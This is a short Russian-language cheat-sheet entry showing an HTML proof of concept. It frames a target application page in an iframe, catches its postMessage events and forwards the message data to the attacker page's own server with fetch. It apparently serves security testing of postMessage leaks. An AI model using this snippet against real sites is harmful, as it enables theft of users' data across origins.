# iframe

Пример ниже открывает в iframe страницу приложения и ждет вызова postMessage с нее

```markup
<script>
  window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data))
  }, false)
</script>
<iframe src="https://example.com"></iframe>
```
